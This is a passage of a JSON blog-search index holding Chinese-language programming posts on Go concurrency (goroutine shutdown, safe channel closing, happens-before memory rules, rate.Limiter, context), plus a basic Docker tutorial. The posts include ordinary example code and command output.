}\n}\n```\n\n当需要终止`Goroutine`的时候只需要关闭这个额外的`channel`：\n\n```\nclose(signal.done)\n```\n\n \n\n\n\n看起来很完备了，这可以处理大部分的情况了。这样做有个弊端，尽管，我们可以期望`close`唤醒`Goroutine`进而退出，但是并不能知道`Goroutine`什么时候完成退出，因为`Goroutine`可能在退出前还有一些善后工作，这个时候我们需要`sync.WaitGroup`。改造一下`routineSignal`：\n\n\n\n```\ntype routineSignal struct {\n    done chan struct{}\n    wg   sync.WaitGroup\n}\n```\n\n\n\n增加一个sync.WaitGroup的实例，在`Goroutine`开始工作时，对wg加1，在`Goroutine`退出前，对wg减1：\n\n```\nfunc (r *reader)loop() {\n    r.signal.wg.Add(1)\n    defer r.signal.wg.Done()\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n 外部，只需要等待`WaitGroup`返回即可：\n\n```\nclose(signal.done)\nsignal.wg.Wait()\n```\n\n只要`Wait()`返回就能断定`Goroutine`结束了。\n\n\n\n推导一下，不难发现，对于writer也可以采用这种方法。于是，总结一下，我们创建了一个叫`routineSignal`的结构，结构里面包含一个`chan`用来通知`Goroutine`结束，包含一个`WaitGroup`用于`Goroutine`通知外部完成善后。这样，通过这个结构的实例优雅的终止`Goroutine`，而且还可以确保`Goroutine`终止成功。 ","tags":["golang"],"categories":["golang"]},{"title":"golang优雅的关闭channel","url":"%2Fp%2F8b210700.html","content":"\n\n\n### Channel使用规范\n\n在不能更改channel状态的情况下，没有简单普遍的方式来检查channel是否已经关闭了\n\n关闭已经关闭的channel会导致panic，所以在closer(关闭者)不知道channel是否已经关闭的情况下去关闭channel是很危险的\n\n发送值到已经关闭的channel会导致panic，所以如果sender(发送者)在不知道channel是否已经关闭的情况下去向channel发送值是很危险的\n\n \n\n### The Channel Closing Principle\n\n在使用Go channel的时候，一个适用的原则是*不要从接收端关闭channel，也不要关闭有多个并发发送者的channel*。\n\n换句话说，如果sender(发送者)只是唯一的sender或者是channel最后一个活跃的sender，那么你应该在sender的goroutine关闭channel，从而通知receiver(s)(接收者们)已经没有值可以读了。维持这条原则将保证永远不会发生向一个已经关闭的channel发送值或者关闭一个已经关闭的channel。\n\n<!-- more -->\n\n### 打破Channel Closing Principle的解决方案 \n\n \n\n如果你因为某种原因从接收端（receiver side）关闭channel或者在多个发送者中的一个关闭channel，那么你应该使用列在[Golang panic/recover Use Cases](https://link.jianshu.com/?t=http://www.tapirgames.com/blog/golang-panic-use-cases)的函数来安全地发送值到channel中（假设channel的元素类型是T）\n\n \n\n```\nfunc SafeSend(ch chan T, value T) (closed bool) {\n    defer func() {\n        if recover() != nil {\n            // the return result can be altered \n            // in a defer function call\n            closed = true\n        }\n    }()\n    \n    ch <- value // panic if ch is closed\n    return false // <=> closed = false; return\n}\n```\n\n \n\n同样的想法也可以用在从多个goroutine关闭channel中：\n\n\n\n```\nfunc SafeClose(ch chan T) (justClosed bool) {\n\tdefer func() {\n\t\tif recover() != nil {\n\t\t\tjustClosed = false\n\t\t}\n\t}()\n\t\n\t// assume ch != nil here.\n\tclose(ch) // panic if ch is closed\n\treturn true // <=> justClosed = true; return\n}\n```\n\n\n\n很多人喜欢用`sync.Once`来关闭channel：\n\n```\n type MyChannel struct {\n\tC    chan T\n\tonce sync.Once\n}\n\nfunc NewMyChannel() *MyChannel {\n\treturn &MyChannel{C: make(chan T)}\n}\n\nfunc (mc *MyChannel) SafeClose() {\n\tmc.once.Do(func() {\n\t\tclose(mc.C)\n\t})\n}\n```\n\n\n\n要知道golang的设计者不提供SafeClose或者SafeSend方法是有原因的，他们本来就不推荐在消费端或者在并发的多个生产端关闭channel，比如关闭只读channel在语法上就彻底被禁止使用了。\n\n \n\n### 优雅的关闭Channel的方法\n\n上文的SafeSend方法一个很大的劣势在于它不能用在select块的case语句中。而另一个很重要的劣势在于像我这样对代码有洁癖的人来说，使用panic/recover和sync/mutex来搞定不是那么的优雅。下面我们引入在不同的场景下可以使用的纯粹的优雅的解决方法。\n\n \n\n#### 多个消费者，单个生产者。\n\n这种情况最简单，直接让生产者关闭channel好了。 \n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 100\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\n\tdataCh := make(chan int, 100)\n\t\n\t// 一个生产者\n\tgo func() {\n\t\tfor {\n\t\t\tif value := rand.Intn(MaxRandomNumber); value == 0 {\n\t\t\t\tclose(dataCh)\n\t\t\t\treturn\n\t\t\t} else {\t\t\t\n\t\t\t\tdataCh <- value\n\t\t\t}\n\t\t}\n\t}()\n\t\n\t// 多个消费者\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func() {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor value := range dataCh {\n\t\t\t\tlog.Println(value)\n\t\t\t}\n\t\t}()\n\t}\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n#### 多个生产者，单个消费者。\n\n这种情况要比上面的复杂一点。我们不能在消费端关闭channel，因为这违背了channel关闭原则。但是我们可以让消费端关闭一个附加的信号来通知发送端停止生产数据。\n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(1)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{})\n\t\n\t\n\t// 多个生产者\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func() {\n\t\t\tfor {\n\t\t\n\t\t\t\t// 目的是尝试退出, 因为越早越好, 此处可以省略, 因为就算多发送了值, 消费者也不会理会了\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- rand.Intn(MaxRandomNumber):\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\t\n\t// 一个消费者\n\tgo func() {\n\t\tdefer wgReceivers.Done()\n\t\t\n\t\tfor value := range dataCh {\n\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\n\t\t\t\t// 这里即是dataCh 的消费者, 也是 stopCh 的生产者\n\t\t\t\tclose(stopCh)\n\t\t\t\treturn\n\t\t\t}\n\t\t\t\n\t\t\tlog.Println(value)\n\t\t}\n\t}()\n\t\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n就上面这个例子，生产者同时也是退出信号channel的接受者，退出信号channel仍然是由它的生产端关闭的，所以这仍然没有违背**channel关闭原则**。值得注意的是，这个例子中生产端和接受端都没有关闭消息数据的channel，channel在没有任何goroutine引用的时候会自行关闭，而不需要显示进行关闭。\n\n \n\n####  多个生产者，多个消费者\n\n \n\n这是最复杂的一种情况，我们既不能让接受端也不能让发送端关闭channel。我们甚至都不能让接受者关闭一个退出信号来通知生产者停止生产。因为我们不能违反**channel关闭原则**。但是我们可以引入一个额外的协调者来关闭附加的退出信号channel。  \n\n \n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n\t\"strconv\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 10\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{}) //生产者是主持人, 消费者是 (dataCh所有生产者和消费者)\n\t\n\ttoStop := make(chan string, 1) //作用是通知主持人去关闭stopCh, 生产者是 (dataCh所有生产者和消费者) 消费者是主持人\n\t\t\n\t\n\tvar stoppedBy string\n\t\n\t// 主持人\n\tgo func() {\n\t\tstoppedBy = <- toStop\n\t\tclose(stopCh)\n\t}()\n\t\n\t// 多个生产者\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func(id string) {\n\t\t\tfor {\n\t\t\t\tvalue := rand.Intn(MaxRandomNumber)\n\t\t\t\tif value == 0 {\n\t\t\t\t\t//通知主持人去干关闭的活\n\t\t\t\t\tselect {\n\t\t\t\t\tcase toStop <- \"sender#\" + id:\n\t\t\t\t\tdefault:\n\t\t\t\t\t}\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n                //尝试尽早退出, 这里不能省略, 因为可能会导致多发送一次\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- value:\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t// 多个消费者\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func(id string) {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor {\n\t\t\t\t//尝试尽早退出, 这里不能省略, 因为可能会导致多接收一次\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n\t\t\t\t//注意此处如果 stopCh 关闭了, 下面也有能 return 不了\n                //因为dataCh也有可能select 到, 所以上一个 select语句不能省略\n                \n                \n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase value := <-dataCh:\n\t\t\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\t\t//通知主持人去干关闭的活\n\t\t\t\t\t\tselect {\n\t\t\t\t\t\tcase toStop <- \"receiver#\" + id:\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tlog.Println(value)\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t\n\twgReceivers.Wait()\n\tlog.Println(\"stopped by\", stoppedBy)\n}\n```\n\n\n\n在这个例子中，仍然遵守着*channel closing principle*。 请注意channel `toStop`的缓冲大小是1.这是为了避免当mederator goroutine 准备好之前第一个通知就已经发送了，导致丢失。\n\n\n\n#### **结论**\n\n没有任何场景值得你去打破channel关闭原则，如果你遇到这样的一种特殊场景，还是建议你好好思考一下自己设计，是不是该重构一下了。\n\n\n\n\n\n#### [个人疑问解答](https://www.jianshu.com/p/d24dfbb33781)\n\n楼主你好, 关于第三个例子有些问题请教\n\n1. value==0时, 为什么还要加个select, 不能直接发送给toStop吗?\n\n```\nif value == 0 {\nselect {\ncase toStop <- \"sender#\" + id:\ndefault:\n}\nreturn\n}\n```\n> 因为可能多个生产者或者多个消费者满足条件, 防止阻塞\n\n\n\n2. select stopCh 为什么写了两次? 第一个select可以省略吗?\n\n```\nselect {\ncase <- stopCh:\n\treturn\ndefault:\n}\n\nselect {\ncase <- stopCh:\n\treturn\ncase dataCh <- value:\n}\n```\n> 为了尽早退出, 因为第二个 Select有可能 select 到dataCh, 虽然已经通知关闭了\n\n\n\n3. toStop的缓冲大小是1, 为了避免准备好之前通知就发送了怎么理解??\n\n   请注意channel toStop的缓冲大小是1.这是为了避免当mederator goroutine 准备好之前第一个通知就已经发送了，导致丢失。\n\n> 因为有缓冲的 发送 happens_before 接收之前, 所以mederator能保证接收到数据\n>\n> 无缓冲的 接收 happens_before 发送之间,  可能会丢失数据","tags":["golang"],"categories":["golang"]},{"title":"golang内存模型和happens_before","url":"%2Fp%2F6196d525.html","content":"\n\n\n### happens-before 术语\n\nhappens-before是一个术语，并不仅仅是Go语言才有的。简单的说，通常的定义如下：\n\n假设A和B表示一个多线程的程序执行的两个操作。如果A happens-before B，那么A操作对内存的影响 将对执行B的线程(且执行B之前)可见。 \n\n\n\n+ 无论使用哪种编程语言，有一点是相同的：如果操作A和B在相同的线程中执行，并且A操作的声明在B之前，那么A happens-before B。\n\n```\nint A, B;\nvoid foo()\n{\n  // This store to A ...\n  A = 5;\n  // ... effectively becomes visible before the following loads. Duh!\n  B = A * A;\n}\n```\n\n \n\n+ 还有一点是，在每门语言中，无论你使用那种方式获得，happens-before关系都是可传递的：如果A happens-before B，同时B happens-before C，那么A happens-before C。当这些关系发生在不同的线程中，传递性将变得非常有用。\n\n<!-- more -->\n\n\n\n刚接触这个术语的人总是容易误解，这里必须澄清的是，happens-before并不是指时序关系，并不是说A happens-before B就表示操作A在操作B之前发生。它就是一个术语，就像光年不是时间单位一样。具体地说：\n\n1.  **A happens-before B并不意味着A在B之前发生。**\n2.  **A在B之前发生并不意味着A happens-before B。**\n\n这两个陈述看似矛盾，其实并不是。如果你觉得很困惑，可以多读几篇它的定义。后面我会试着解释这点。记住，happens-before 是一系列语言规范中定义的操作间的关系。它和时间的概念独立。这和我们通常说”A在B之前发生”时表达的真实世界中事件的时间顺序不同。\n\n\n\n### A happens-before B并不意味着A在B之前发生 (编译器可能会重排)\n\n\n\n这里有个例子，其中的操作具有happens-before关系，但是实际上并不一定是按照那个顺序发生的。下面的代码执行了(1)对A的赋值，紧接着是(2)对B的赋值。\n\n```\nint A = 0;\nint B = 0;\nvoid main()\n{\n    A = B + 1; // (1)\n    B = 1; // (2)\n}\n```\n\n\n\n根据前面说明的规则，(1) happens-before (2)。但是，如果我们使用gcc -O2编译这个代码，编译器将产生一些指令重排序。有可能执行顺序是这样子的：\n\n```\n将B的值取到寄存器\n将B赋值为1\n将寄存器值加1后赋值给A\n```\n\n也就是到第二条机器指令(对B的赋值)完成时，对A的赋值还没有完成。换句话说，(1)并没有在(2)之前发生!\n\n那么，这里违反了happens-before关系了吗？让我们来分析下，根据定义，操作(1)对内存的影响必须在操作(2)执行之前对其可见。换句话说，对A的赋值必须有机会对B的赋值有影响.\n\n但是在这个例子中，对A的赋值其实并没有对B的赋值有影响。即便(1)的影响真的可见，(2)的行为还是一样。所以，这并不能算是违背happens-before规则。\n\n\n\n### A在B之前发生并不意味着A happens-before B (虽然在之前发生但不满足规则)\n\n下面这个例子中，所有的操作按照指定的顺序发生，但是并能不构成happens-before 关系。假设一个线程调用pulishMessage，同时，另一个线程调用consumeMessage。 由于我们并行的操作共享变量，为了简单，我们假设所有对int类型的变量的操作都是原子的。\n\n\n\n```\nint isReady = 0;\nint answer = 0;\nvoid publishMessage()\n{\n  answer = 42; // (1)\n  isReady = 1; // (2)\n}\nvoid consumeMessage()\n{\n  if (isReady)\t\t\t    // (3) <-- Let's suppose this line reads 1\n  \tprintf(\"%d\\n\", answer); // (4)\n}\n```\n\n\n\n根据程序的顺序，在(1)和(2)之间存在happens-before 关系，同时在(3)和(4)之间也存在happens-before关系。\n\n\n\n除此之外，我们假设在运行时，isReady读到1(是由另一个线程在(2)中赋的值)。在这中情形下，我们可知(2)一定在(3)之前发生。但是这并不意味着在(2)和(3)之间存在happens-before 关系!\n\nhappens-before 关系只在语言标准中定义的地方存在，这里并没有相关的规则说明(2)和(3)之间存在happens-before关系，即便(3)读到了(2)赋的值。\n\n还有，由于(2)和(3)之间，(1)和(4)之间都不存在happens-before关系，那么(1)和(4)的内存交互也可能被重排序 (要不然来自编译器的指令重排序，要不然来自处理器自身的内存重排序)。那样的话，即使(3)读到1，(4)也会打印出“0“。\n\n \n\n### Go关于同步的规则 (往冰箱放西瓜, 先放后拿,往手里递西瓜, 先接后放)\n\n\n\n关于channel的happens-before在Go的内存模型中提到了三种情况：\n\n- 对一个channel的发送操作 happens-before 相应channel的接收操作完成     \t  **(往冰箱放西瓜, 先放后拿)**\n- 关闭一个channel happens-before 从该Channel接收到最后的返回值0                \n\n- 不带缓冲的channel的接收操作 happens-before 相应channel的发送操作完成      **(往手里递西瓜, 先接后放) **     \n\n\n\n先看一个简单的例子：\n\n```\nvar c = make(chan int, 10)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    c <- 0  // (2)\n}\nfunc main() {\n    go f()\n    <-c   // (3)\n    print(a)  // (4)\n}\n```\n\n上述代码可以确保输出\"hello, world\"，因为(1) happens-before (2)，(4) happens-after (3)，再根据上面的第一条规则(2)是 happens-before (3)的，最后根据happens-before的可传递性，于是有(1) happens-before (4)，也就是a = \"hello, world\" happens-before print(a)。\n\n\n\n再看另一个例子：\n\n```\nvar c = make(chan int)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\n根据上面的第三条规则(2) happens-before (3)，最终可以保证(1) happens-before (4)。\n\n\n\n\n\n如果我把上面的代码稍微改一点点，将c变为一个带缓存的channel，则print(a)打印的结果不能够保证是\"hello world\"。\n\n```\nvar c = make(chan int, 1)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\n因为这里不再有任何同步保证，使得(2) happens-before (3)。可以回头分析一下本节最前面的例子，也是没有保证happens-before条件。\n\n\n\n\n\n### golang happen before 的保证\n\n\n\n**1) 单线程**\n\n\n\n**2) Init 函数**\n\n- 如果包P1中导入了包P2，则P2中的init函数Happens Before 所有P1中的操作\n- main函数Happens After 所有的init函数\n\n\n\n3) **Goroutine**\n\n- Goroutine的创建Happens Before所有此Goroutine中的操作\n- Goroutine的销毁Happens After所有此Goroutine中的操作\n\n\n\n **4) Channel**\n\n- 对一个元素的send操作Happens Before对应的receive 完成操作\n- 对channel的close操作Happens Before receive 端的收到关闭通知操作\n- 对于Unbuffered Channel，对一个元素的receive 操作Happens Before对应的send完成操作\n- 对于Buffered Channel，假设Channel 的buffer 大小为C，那么对第k个元素的receive操作，Happens Before第k+C个send完成操作。可以看出上一条Unbuffered Channel规则就是这条规则C=0时的特例\n\n\n\n**5) Lock**\n\nGo里面有Mutex和RWMutex两种锁，RWMutex除了支持互斥的Lock/Unlock，还支持共享的RLock/RUnlock。\n\n- 对于一个Mutex/RWMutex，设n < m，则第n个Unlock操作Happens Before第m个Lock操作。\n- 对于一个RWMutex，存在数值n，RLock操作Happens After 第n个UnLock，其对应的RUnLock Happens Before 第n+1个Lock操作。\n\n*简单理解就是这一次的Lock总是Happens After上一次的Unlock，读写锁的RLock HappensAfter上一次的UnLock，其对应的RUnlock Happens Before 下一次的Lock。*\n\n```\nvar l sync.Mutex\nvar a string\nfunc f() {\n    a = \"hello, world\" // (1)\n    l.Unlock() // (2)\n}\nfunc main() {\n    l.Lock() // (3)\n    go f()\n    l.Lock() // (4)\n    print(a) // (5)\n}\n```\n\n(1) happens-before (2) happens-before (4) happens-before (5)\n\n\n\n**6) Once**\n\nonce.Do中执行的操作，Happens Before 任何一个once.Do调用的返回。","tags":["golang"],"categories":["golang"]},{"title":"docker基础入门","url":"%2Fp%2Fd6254db7.html","content":"\n\n\n\n\n# 1. 使用镜像\n\n### 1.1 获取镜像\n\n```\ndocker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]\n```\n\n- Docker 镜像仓库地址：地址的格式一般是 `<域名/IP>[:端口号]`。默认地址是 Docker Hub。\n- 仓库名：如之前所说，这里的仓库名是两段式名称，即 `<用户名>/<软件名>`。对于 Docker Hub，如果不给出用户名，则默认为 `library`，也就是官方镜像。\n\n```\ndocker pull ubuntu:16.04\n16.04: Pulling from library/ubuntu\n```\n\n\n\n#### 1.2 运行容器\n\n```\ndocker run -it --rm \\\n    ubuntu:16.04 \\\n    bash\n```\n\n- `-it`：这是两个参数，一个是 `-i`：交互式操作，一个是 `-t` 终端。我们这里打算进入 `bash` 执行一些命令并查看返回结果，因此我们需要交互式终端。\n- `--rm`：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 `docker rm`。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 `--rm` 可以避免浪费空间。\n- `ubuntu:16.04`：这是指用 `ubuntu:16.04` 镜像为基础来启动容器。\n- `bash`：放在镜像名后的是**命令**，这里我们希望有个交互式 Shell，因此用的是 `bash`\n\n\n\n### 1.3 列出镜像\n\n```\ndocker images\n```\n\n列表包含了 `仓库名`、`标签`、`镜像 ID`、`创建时间` 以及 `所占用的空间`。\n\n**镜像 ID** 则是镜像的唯一标识，一个镜像可以对应多个**标签**。\n\n\n\n### 1.4 虚悬镜像\n\n `docker pull` 可能导致这种情况，`docker build` 也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为 `<none>` 的镜像。这类无标签镜像也被称为 **虚悬镜像(dangling image)**\n\n\n\n一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。\n\n```\ndocker image prune\n```\n\n\n\n### 1.4 删除本地镜像\n\n如果要删除本地的镜像，可以使用 `docker image rm` 命令，其格式为：\n\n```\n$ docker image rm [选项] <镜像1> [<镜像2> ...]\n```\n\n####  \n\n# 2. Dockerfile 定制镜像\n\nDockerfile 是一个文本文件，其内包含了一条条的**指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。\n\n\n\n### 2.1 构建镜像\n\n在 `Dockerfile` 文件所在目录执行：\n\n```\n$ docker build -t nginx:v3 .\n```\n\n\n\n这里我们使用了 `docker build` 命令进行镜像构建。其格式为：\n\n```\ndocker build [选项] <上下文路径/URL/->\n```\n\n\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"令牌桶算法_golang_rate对速度进行限制","url":"%2Fp%2Fe25fe1fc.html","content":"\n### 限流算法\n\n限流算法，一般有漏桶算法和令牌桶算法两种限流算法。\n\n+ 漏桶算法\n\n漏桶算法(Leaky Bucket)是网络世界中流量整形（Traffic Shaping）或速率限制（Rate Limiting）时经常使用的一种算法，它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶算法提供了一种机制，通过它，突发流量可以被整形以便为网络提供一个稳定的流量。\n\n漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。 在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。\n\n如图所示，把请求比作是水，水来了都先放进桶里，并以限定的速度出水，当水来得过猛而出水不够快时就会导致水直接溢出，即拒绝服务。\n\n![1](令牌桶算法_golang_rate对速度进行限制/1.png)\n<!-- more -->\n+ 令牌桶算法\n\n令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。\n\n令牌桶算法的原理是系统会以一个恒定的速度往桶里放入令牌，而如果请求需要被处理，则需要先从桶里获取一个令牌，当桶里没有令牌可取时，则拒绝服务。从原理上看，令牌桶算法和漏桶算法是相反的，一个“进水”，一个是“漏水”。\n\n![2](令牌桶算法_golang_rate对速度进行限制/2.png)\n\n+ 漏桶算法和令牌桶算法的选择\n\n漏桶算法与令牌桶算法在表面看起来类似，很容易将两者混淆。但事实上，这两者具有截然不同的特性，且为不同的目的而使用。\n\n漏桶算法与令牌桶算法的区别在于，漏桶算法能够强行限制数据的传输速率，令牌桶算法能够在限制数据的平均传输速率的同时还允许某种程度的突发传输。\n\n需要注意的是，在某些情况下，漏桶算法不能够有效地使用网络资源，因为漏桶的漏出速率是固定的，所以即使网络中没有发生拥塞，漏桶算法也不能使某一个单独的数据流达到端口速率。因此，漏桶算法对于存在突发特性的流量来说缺乏效率。而令牌桶算法则能够满足这些具有突发特性的流量。通常，漏桶算法与令牌桶算法结合起来为网络流量提供更高效的控制。\n\n\n\n### golang rate.Limiter\n\n```\nfunc NewLimiter(r Limit, b int) *Limiter {\n\treturn &Limiter{\n\t\tlimit: r,\n\t\tburst: b,\n\t}\n}\n```\nLimter限制时间的发生频率，采用令牌池的算法实现。这个池子一开始容量为b，装满b个令牌，然后每秒往里面填充r个令牌。 \n\n由于令牌池中最多有b个令牌，所以一次最多只能允许b个事件发生，一个事件花费掉一个令牌。\n\n\n```\nl := rate.NewLimiter(1, 3) \n//第一个参数为每秒发生多少次事件，第二个参数是最大可运行多少个事件\n```\n\n\n### Allow/AllowN 当没有可用事件时，返回false\n\nAllowN标识在时间now的时候，n个事件是否可以同时发生(也意思就是now的时候是否可以从令牌池中取n个令牌)。如果你需要在事件超出频率的时候丢弃或跳过事件，就使用AllowN,否则使用Reserve或Wait.\n\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3) //刚开始有3个, 一秒填1个\n\n\tfor {\n\t\tif l.AllowN(time.Now(), 1) { //当前从令牌池取出 n 个令牌\n\t\t\tfmt.Println(time.Now().Format(\"04:05.000\")) //先把池子的3个消耗完毕, 以后1秒进入令牌池一个\n\t\t} else {\n\t\t\ttime.Sleep(1 * time.Second / 10)\n\t\t\tfmt.Println(time.Now().Format(\"Second 04:05.000\"))\n\t\t}\n\t}\n}\n\n\n\n43:32.534\n43:32.534\n43:32.534\nSecond 43:32.635\nSecond 43:32.737\nSecond 43:32.838\nSecond 43:32.938\nSecond 43:33.039\nSecond 43:33.144\nSecond 43:33.249\nSecond 43:33.350\nSecond 43:33.451\nSecond 43:33.552\n43:33.552\nSecond 43:33.653\nSecond 43:33.753\nSecond 43:33.854\nSecond 43:33.955\nSecond 43:34.055\n```\n\n\n\n### Wait/WaitN 当没有可用事件时，将阻塞等待\n\nWaitN 阻塞当前直到limit允许n个事件的发生。\n\n - 如果n超过了令牌池的容量大小则报错。\n\n - 如果Context被取消了则报错。\n\n - 如果limit的等待时间超过了Context的超时时间则报错。\n\n\n```\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tc, _ := context.WithCancel(context.TODO())\n\tfor {\n\t\tl.WaitN(c, 1)\n\t\tfmt.Println(time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n39:58.446\n39:58.446\n39:58.446\n39:59.451\n40:00.451\n40:01.450\n40:02.450\n```\n\n\n\n\n### Reserve/ReserveN\n\n当没有可用事件时返回对象Reservation ，标识调用者需要等多久才能等到n个事件发生(意思就是等多久令牌池中至少含有n个令牌)。\n\n如果ReserveN 传入的n大于令牌池的容量b，那么返回false.\n\n如果希望根据频率限制等待和降低事件发生的速度而不丢掉事件，就使用这个方法。\n\n我认为这里要表达的意思就是如果事件发生的频率是可以由调用者控制的话，可以用ReserveN 来控制事件发生的速度而不丢掉事件。如果要使用context的截止日期或cancel方法的话，使用WaitN。\n\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tr := l.ReserveN(time.Now(), 1)\n\t\ts := r.Delay()\n\t\ttime.Sleep(s)\n\t\tfmt.Println(s, time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n\n0s 44:54.118\n0s 44:54.119\n0s 44:54.119\n999.857594ms 44:55.124\n994.670516ms 44:56.124\n994.778299ms 44:57.124\n994.763486ms 44:58.124\n```\n","tags":["golang"],"categories":["golang"]},{"title":"golang_context包的介绍和使用","url":"%2Fp%2F63c8f369.html","content":"\n\n\n\n### Context介绍\n一个网络请求Request，每个Request都需要开启一个goroutine做一些事情，这些goroutine又可能会开启其他的goroutine。所以我们需要一种可以跟踪goroutine的方案，才可以达到控制他们的目的，这就是Go语言为我们提供的Context，称之为上下文非常贴切，它就是goroutine的上下文。\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo func(ctx context.Context) {\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase <-ctx.Done():\n\t\t\t\tfmt.Println(\"监控退出，停止了...\")\n\t\t\t\treturn\n\t\t\tdefault:\n\t\t\t\tfmt.Println(\"goroutine监控中...\")\n\t\t\t\ttime.Sleep(2 * time.Second)\n\t\t\t}\n\t\t}\n\t}(ctx)\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\n\n\ngoroutine监控中...\ngoroutine监控中...\ngoroutine监控中...\ngoroutine监控中...\ngoroutine监控中...\n可以了，通知监控停止\n监控退出，停止了...\n```\n\n\ncontext.Background() 返回一个空的Context，这个空的Context一般用于整个Context树的根节点。然后我们使用context.WithCancel(parent)函数，创建一个可取消的子Context，然后当作参数传给goroutine使用，这样就可以使用这个子Context跟踪这个goroutine。\n<!-- more -->\n\n\n\n### 控制多个gorotuine\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo watch(ctx, \"监控1\")\n\tgo watch(ctx, \"监控2\")\n\tgo watch(ctx, 